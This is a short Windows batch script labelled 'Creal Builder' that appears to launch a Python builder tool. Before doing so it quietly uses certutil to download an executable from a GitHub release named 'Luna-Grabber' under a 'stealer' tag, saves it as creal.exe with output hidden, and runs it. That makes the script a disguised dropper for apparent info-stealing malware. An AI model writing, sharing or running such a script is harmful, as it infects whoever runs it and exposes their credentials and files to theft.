
@echo off
set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
set "Dossier=img"
set "NomFichier=%Dossier%\creal.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
title Creal Builder
python builder.pyw
pause